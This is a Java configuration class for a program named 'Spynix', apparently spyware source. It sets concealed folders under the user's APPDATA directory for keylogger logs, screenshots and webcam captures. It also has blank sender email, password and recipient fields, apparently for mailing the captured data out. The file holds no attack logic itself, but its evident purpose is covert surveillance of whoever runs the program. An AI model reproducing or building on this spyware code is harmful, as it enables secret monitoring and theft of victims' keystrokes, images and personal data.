package ml.inix;

public class Config {

    public static String PATH = System.getenv("APPDATA") + "\\";
    public static final String NAME = "Spynix";
    public static final String PATH_KEYLOGGER = PATH + NAME + "\\logs\\";
    public static final String PATH_SCREENSHOT = PATH + NAME + "\\screenshots\\";
    public static final String PATH_WEBCAM = PATH + NAME + "\\webcaptures\\";

    public static String SENDER_EMAIL = "";
    public static String SENDER_PASS = "";
    public static String REC_MAIL = "";

    public static int TIMEOUT = 0;

}
